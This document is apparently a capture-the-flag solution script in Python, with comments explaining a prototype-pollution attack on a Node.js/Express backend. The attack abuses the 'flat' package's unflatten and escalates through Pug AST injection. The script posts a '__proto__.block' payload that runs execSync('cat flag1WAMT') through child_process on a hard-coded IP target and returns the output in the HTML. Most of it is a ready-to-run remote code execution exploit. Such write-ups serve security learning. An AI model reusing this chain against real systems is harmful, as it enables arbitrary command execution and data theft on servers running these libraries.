# Looking at the nodejs / express backend source code, you can see in 'router' file that the post route
# unflattens the request body. Looking forward about 'flat' package, I could see that it suffered from
# prototype pollution, so I thought there must be a way to inject some properties in the backend via a
# flattened object, but, how could this be useful to explore the insights of the server, and what should
# I inject to accomplish that?
# Later, I researched about Pug (module used as a template engine) because this kind of subsystem usually have
# injection vulnerabilities. As a result, I found out that prototype pollution could be used to execute arbitrary
# JS if certain AST (abstract syntax tree) fields are polluted (basically, 'injected') (https://blog.p6.is/AST-Injection/#Exploit).
# Setting the block property equal to a AST whose 'line' field contains JS code, we can make the flag arrive the client.
# Finally, and very important, what we put in the field 'block.val' will be appended to the HTML that pug generates and sends
# to the client.
#

import requests
# TARGET_DOMAIN = 'http://localhost:1337'
TARGET_DOMAIN = 'http://64.227.38.214:32042'

# Read the 'flag1WAMT' named file and add its content to the AST as appended HTML that will be sent to the client.
# In order to know the files in the server directory I executed a 'ls' command.
payload = 'Object.prototype.block.val = process.mainModule.require(\'child_process\').execSync(\'cat flag1WAMT\', {encoding: \'utf-8\'})'

pollutedJson = {
    'artist.name': 'Gingell',
    '__proto__.block':
    {
        "type": "Text",
        "line": payload,
    },
}

# execute
print(requests.post(TARGET_DOMAIN + '/api/submit', json=pollutedJson).text)
